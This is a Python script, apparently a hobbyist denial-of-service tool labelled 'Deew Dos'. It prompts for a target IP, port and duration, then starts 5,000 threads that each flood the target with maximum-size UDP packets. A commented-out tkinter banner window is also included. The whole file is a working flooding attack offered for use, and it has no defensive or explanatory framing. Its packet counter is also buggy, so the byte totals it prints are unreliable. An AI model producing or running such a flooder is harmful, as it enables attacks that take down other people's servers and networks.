import socket
import time
import tkinter as tk
import threading
from concurrent.futures import ThreadPoolExecutor
def flood(ip, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 65507  # Maximum UDP payload size
    bytes_to_send = b"A" * packet_size  # Adjust to 65507 bytes
    timeout = time.time() + duration
    sent_packets = 0

    while True:
        if time.time() > timeout:
            break
        try:
            client.sendto(bytes_to_send, (ip, port))
            sent_packets += 10
            if sent_packets % 10 == 0:  # Print status every 10 packets
                print(f"Sent packet {sent_packets} to {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")
            break

    total_bytes_sent = sent_packets * packet_size
    print(f"Total bytes sent: {total_bytes_sent} bytes")

def create_moving_text_window():
    def reopen_window():
        global window_open
        if not window_open:
            window_open = True
            create_moving_text_window()

    def on_closing():
        global window_open
        window_open = False
        root.destroy()
        reopen_window()

    global window_open
    window_open = True

    root = tk.Tk()
    root.title("Deew Dos | From love")
    root.geometry("800x100")  # Window size

    canvas = tk.Canvas(root, width=2000, height=200, bg="black")
    canvas.pack()

    text = canvas.create_text(400, 50, text="Tool Make By Deew", font=("Helvetica", 20))

    # List of rainbow colors
    rainbow_colors = [
        "#FF0000", "#FF7F00", "#FFFF00", "#7FFF00", "#00FF00", "#00FF7F",
        "#00FFFF", "#007FFF", "#0000FF", "#7F00FF", "#FF00FF", "#FF007F"
    ]
    color_index = 0

    def update_color():
        nonlocal color_index
        canvas.itemconfig(text, fill=rainbow_colors[color_index])
        color_index = (color_index + 1) % len(rainbow_colors)
        root.after(10, update_color)  # Update color every 10ms

    def move_text():
        canvas.move(text, 2, 0)
        if canvas.coords(text)[0] > 800:
            canvas.coords(text, -400, 50)  # Reset text position
        root.after(10, move_text)  # Update every 10ms

    root.protocol("HARD TARGET", on_closing)

    update_color()
    move_text()
    root.mainloop()

def start_flood_threads(ip, port, duration, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=flood, args=(ip, port, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))
    duration = int(input("Enter duration (in seconds): "))
    num_workers = 5000
    
    start_flood_threads(target_ip, target_port, duration, num_workers)
    # Create moving text window in a separate thread
    # threading.Thread(target=create_moving_text_window, daemon=True).start()

    # flood(target_ip, target_port, duration)
